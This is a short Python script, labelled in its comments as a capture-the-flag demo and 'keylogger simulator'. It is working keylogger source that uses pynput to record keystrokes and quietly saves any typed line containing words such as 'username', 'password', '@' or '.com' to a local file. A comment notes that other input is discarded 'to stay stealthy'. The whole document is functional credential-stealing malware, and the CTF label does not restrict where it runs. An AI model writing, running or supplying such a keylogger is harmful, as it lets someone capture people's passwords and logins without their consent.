from pynput import keyboard

# 1. SETUP: Variables for our CTF Demo
log_file = "mission_004_results.txt"
buffer = ""
# Keywords that trigger the "Save to Log" action
triggers = ["username", "password", "www.", ".com", "@"]

def on_press(key):
    global buffer
    try:
        # Capture alphanumeric keys
        current_char = key.char
        buffer += current_char
    except AttributeError:
        # Handle special keys (Space, Enter, etc.)
        if key == keyboard.Key.space:
            buffer += " "
        elif key == keyboard.Key.enter:
            check_and_save()
            buffer = ""

def check_and_save():
    """Checks if the buffer contains a sensitive pattern before logging"""
    global buffer
    # Check if any trigger word is in the current line
    if any(trigger in buffer.lower() for trigger in triggers):
        with open(log_file, "a") as f:
            f.write(f"[SENSITIVE DATA DETECTED]: {buffer}\n")
        print(f"[*] Trigger detected. Pattern saved to {log_file}")
    else:
        # In a real CTF, we discard non-sensitive data to stay stealthy
        pass

# Start the listener
print("[*] Keylogger Simulator Active. Press Ctrl+C to stop.")
with keyboard.Listener(on_press=on_press) as listener:
    listener.join()
